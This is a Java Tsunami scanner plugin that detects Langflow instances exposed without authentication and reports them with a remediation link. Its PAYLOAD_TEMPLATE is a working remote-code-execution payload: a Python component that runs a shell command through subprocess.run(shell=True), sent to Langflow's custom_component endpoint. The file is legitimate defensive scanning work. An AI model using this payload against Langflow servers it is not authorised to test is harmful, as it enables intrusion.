/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.langflow.exposed;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin that detects an exposed instance of Langflow. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Langflow_exposedUI ",
    version = "0.1",
    description = "This plugin detects an exposed instance of Langflow.",
    author = "Giacomo Coluccelli (giacomo@doyensec.com)",
    bootstrapModule = LangflowExposedUiDetectorBootstrapModule.class)
public final class LangflowExposedUiDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String VERSION_ENDPOINT = "api/v1/version";
  private static final String COMPONENT_ENDPOINT = "api/v1/custom_component";

  private static final String PAYLOAD_TEMPLATE =
      "{\"code\":\"import subprocess\\n"
          + "from langflow.custom import Component\\n"
          + "class TsunamiComponent(Component):\\n"
          + "    def __init__(self, *args, **kwargs):\\n"
          + "        super().__init__(*args, **kwargs)\\n"
          + "        subprocess.run(\\\"%s\\\", shell=True)\\n"
          + "\\n"
          + "\"}";

  private static final String REFLECTIVE_PAYLOAD = "id";

  private final Clock utcClock;

  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;

  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_ID = "langflow_exposed_ui_detector";

  @VisibleForTesting static final String VULNERABILITY_REPORT_TITLE = "Langflow Exposed UI";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected a Langflow instance without proper authentication. Langflow allows"
          + " users to customize components by writing Python code. Exposing it without proper"
          + " authentication introduces a risk of remote code execution (RCE).\n";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_CALLBACK =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via an out of band callback.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_RESPONSE_MATCHING =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via response matching only, as the Tsunami Callback"
          + " Server was not available.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Disable the auto-login feature setting the ENABLE_AUTO_LOGIN environment variable to False."
          + " Instructions are available in the official documentation:"
          + " https://docs.langflow.org/configuration-authentication#langflow_auto_login";

  @VisibleForTesting private Severity severity = Severity.HIGH;

  @VisibleForTesting
  private String description = VULNERABILITY_REPORT_DESCRIPTION_RESPONSE_MATCHING;

  @Inject
  LangflowExposedUiDetector(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @Annotations.OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("LangflowExposedUiDetector - starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isLangflow)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                    .setValue(VULNERABILITY_ID))
            .setSeverity(severity)
            .setTitle(VULNERABILITY_REPORT_TITLE)
            .setDescription(description)
            .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
            .build());
  }

  private boolean isLangflow(NetworkService networkService) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String targetUri = rootUrl + VERSION_ENDPOINT;
    String body = "";

    HttpRequest req =
        HttpRequest.get(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
            .build();

    HttpResponse response;
    try {
      response = this.httpClient.send(req, networkService);
    } catch (IOException e) {
      logger.atInfo().log("LangflowExposedUiDetector - request error: %s", e.getMessage());
      return false;
    }

    if (response.bodyString().isPresent()) {
      body = response.bodyString().get();
    }

    JsonObject obj = JsonParser.parseString(body).getAsJsonObject();
    String pkg = obj.get("package").getAsString();

    return pkg.contains("Langflow");
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = null;
    try {
      payload = payloadGenerator.generate(config);
    } catch (NotImplementedException e) {
      logger.atInfo().log(
          "LangflowExposedUiDetector - error generating oob payload. Fallback to response matching"
              + " only");
    }

    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String targetUri = rootUrl + COMPONENT_ENDPOINT;

    // If payload generation failed, fallback to reflective payload
    String payloadString =
        (payload != null && payload.getPayload() != null)
            ? payload.getPayload()
            : REFLECTIVE_PAYLOAD;

    // if payload was not generated correctly we fallback to a reflective payload and just test if
    // the authenticated endpoint is reachable
    String requestBody = String.format(PAYLOAD_TEMPLATE, payloadString);

    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(requestBody))
            .build();

    HttpResponse response;
    try {
      response = this.httpClient.send(req, networkService);

      if (response.status().code() == HttpStatus.UNAUTHORIZED.code()
          || response.status().code() == HttpStatus.FORBIDDEN.code()) {
        // failed to send payload to authenticated langflow endpoint.
        // UI is authenticated.
        return false;
      } else if ((payload == null || payload.getPayload() == null)
          && response.status().isSuccess()) {
        // If callback server is not present but the request to the authenticated endpoint succeeded
        // the UI is exposed and we report the vulnerability as high severity
        return true;
      }
    } catch (IOException e) {
      logger.atInfo().log("LangflowExposedUiDetector - request error: %s", e.getMessage());
      return false;
    }

    if (payload == null) {
      // This is a corrupted state, you shouldn't land here - aborting detection.
      logger.atInfo().log("LangflowExposedUiDetector - detection failed in an unexpected way");
      return false;
    }

    // If the callback server is set up we wait for the OOB callback verification step and report
    // with CRITICAL severity
    if (payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atInfo().log("LangflowExposedUiDetector - waiting for RCE callback.");
      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
      severity = Severity.CRITICAL;
      description = VULNERABILITY_REPORT_DESCRIPTION_CALLBACK;
      return payload.checkIfExecuted();
    }

    // If the callback server is not available we skip the OOB callback verification and report with
    // HIGH severity
    // If the UI was authenticated we would have failed before
    return true;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(getAdvisories().get(0))
        .build();
  }
}
